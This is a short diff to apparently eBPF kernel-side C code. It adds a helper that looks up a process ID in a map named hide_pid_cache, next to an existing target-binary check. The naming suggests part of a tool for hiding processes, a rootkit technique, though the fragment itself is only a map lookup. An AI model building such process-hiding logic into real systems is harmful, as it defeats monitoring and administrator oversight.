@@ -72,6 +72,11 @@ static __always_inline int __is_target_bin(void) {
     return *bin_cache_flag == 1;
 }
 
+static __always_inline int __is_target_process(__u32 pid)
+{
+	return bpf_map_lookup_elem(&hide_pid_cache, &pid) != NULL;
+}
+
 //----------------------------------------------------
 // ┌────────────────────────────────────┐
 //  STR MATCHING
